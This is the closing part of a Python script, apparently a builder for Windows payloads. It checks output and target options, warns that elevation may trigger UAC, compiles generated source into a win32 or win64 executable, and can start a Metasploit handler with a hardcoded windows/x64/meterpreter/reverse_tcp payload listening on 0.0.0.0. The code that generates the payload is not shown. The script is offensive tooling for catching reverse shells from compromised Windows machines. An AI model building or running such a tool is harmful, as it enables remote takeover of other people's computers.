		if ("listener" in _ag) and (_ag["listener"]):
			Print.add_name_value("MSF Listener", "MSF listener will open automatically", Print.info)

	if ("output" not in _ag) or (_ag["output"] == ""):
		Print.error("'output' parameter is missing, or empty")
		sys.exit(2)
	else:
		Print.add_name_value("Output", _ag["output"], Print.info)

	if ("target" not in _ag) or (_ag["target"] == ""):
		Print.error("'target' parameter is missing, or empty")
		sys.exit(2)
	elif (_ag["target"] == "win32") or (_ag["target"] == "win64"):
		Print.add_name_value("Target", _ag["target"].lower(), Print.info)
	else:
		Print.error("'target' must be either win32 or win64")
		sys.exit(2)

	if ("use-elevation" in _ag):
		Print.add_name_value("Invoke with elevation", "Yes", Print.info)
		Print.warning("- This may trigger the UAC")

	compile(gen_source(_ag), _ag["output"], _ag["target"])
	Print.name_value_print()
	
	## Last minute addition 
	## TODO :: Add better interactivity through 'popen' if possible, else scrap feature
	if ("listener" in _ag) and (_ag["listener"]):
		Print.text()
		Print.info("Note: MSF will stay open after session ends")
		Print.status("Opening MSF listener...")
		# hardcoded to use x64 meterpreter for now
		os.system("msfconsole -x \"use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST 0.0.0.0;exploit\" -q")

if __name__ == "__main__":
	main(sys.argv[1:])
